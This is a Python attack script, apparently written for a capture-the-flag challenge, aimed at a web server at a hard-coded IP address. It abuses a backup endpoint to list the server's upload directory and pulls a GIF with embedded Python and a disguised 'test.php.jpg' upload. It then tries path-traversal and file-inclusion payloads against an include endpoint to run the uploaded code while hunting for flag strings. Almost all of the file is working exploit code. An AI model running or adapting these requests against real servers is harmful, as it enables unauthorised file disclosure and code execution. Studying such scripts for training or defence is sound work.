import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("检查包含Python代码的文件")
print("="*70)

# 检查包含Python代码的文件
r = session.get(f"{TARGET}/uploads/0f9a74c0d29b49bb91f91c739349a426.gif", timeout=15)
content = r.content

print(f"文件: 0f9a74c0d29b49bb91f91c739349a426.gif")
print(f"Content-Type: {r.headers.get('Content-Type', '')}")
print(f"大小: {len(content)} bytes")

# 解析GIF内容
hex_content = content.hex()
print(f"十六进制内容:\n{hex_content}")

# 转换为可读文本
text = content.decode('utf-8', errors='replace')
print(f"\n文本内容:\n{text}")

# 提取嵌入的Python代码
python_start = text.find("import")
python_end = text.find(";") + 1
python_code = text[python_start:]
print(f"\n嵌入的Python代码: {python_code}")

# 检查是否包含flag
flag_match = re.search(r'flag\{[^}]+\}', text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

print("\n" + "="*70)
print("检查所有上传文件的隐藏内容")
print("="*70)

# 获取文件列表
r = session.get(f"{TARGET}/backup", params={"path": "F:\\small peoject\\python-lab\\uploads"}, timeout=15)
body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if body:
    files_text = body.group(1).strip()
    files = [f.strip() for f in files_text.split('\n') if f.strip()]
    
    print(f"文件总数: {len(files)}")
    
    # 检查每个文件的文本内容
    for filename in files:
        if filename and filename != '.gitkeep':
            try:
                r = session.get(f"{TARGET}/uploads/{filename}", timeout=15)
                if r.status_code == 200:
                    content = r.content
                    
                    # 转换为文本
                    text = content.decode('utf-8', errors='replace')
                    
                    # 搜索可疑内容
                    suspicious_content = []
                    
                    # 搜索Python代码
                    if "import" in text or "exec" in text or "eval" in text:
                        # 提取代码部分
                        code_part = text[20:-10] if len(text) > 30 else text
                        suspicious_content.append(f"Python代码: {code_part}")
                    
                    # 搜索PHP代码
                    if "<?" in text:
                        suspicious_content.append("PHP代码")
                    
                    # 搜索flag关键词
                    if "flag" in text.lower():
                        suspicious_content.append(f"包含flag: {text}")
                    
                    if suspicious_content:
                        print(f"\n>>> {filename}")
                        for item in suspicious_content:
                            print(f"  {item}")
                        
                        # 检查完整flag
                        flag_match = re.search(r'flag\{[^}]+\}', text, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND IN {filename}: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
            except:
                pass

print("\n" + "="*70)
print("检查可疑的PHP文件")
print("="*70)

# 检查包含PHP代码的文件
php_file = "29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg"
r = session.get(f"{TARGET}/uploads/{php_file}", timeout=15)
if r.status_code == 200:
    content = r.content
    text = content.decode('utf-8', errors='replace')
    
    print(f"文件: {php_file}")
    print(f"内容:\n{text}")
    
    # 搜索flag
    flag_match = re.search(r'flag\{[^}]+\}', text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND IN {php_file}: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n" + "="*70)
print("检查文件包含功能是否能执行上传的Python代码")
print("="*70)

# 尝试通过文件包含执行Python代码
include_payloads = [
    "uploads/0f9a74c0d29b49bb91f91c739349a426.gif",
    "../uploads/0f9a74c0d29b49bb91f91c739349a426.gif",
    "F:\\small peoject\\python-lab\\uploads\\0f9a74c0d29b49bb91f91c739349a426.gif",
    "0f9a74c0d29b49bb91f91c739349a426",
    "0f9a74c0d29b49bb91f91c739349a426.py",
]

for payload in include_payloads:
    r = session.get(f"{TARGET}/include", params={"page": payload}, timeout=15)
    
    if r.status_code == 200:
        body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if body:
            content = body.group(1).strip()
            
            if len(content) > 20 and "Blocked" not in content:
                print(f"\n>>> include?page={payload}")
                print(f"响应: {content[:300]}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)

print("\n测试完成")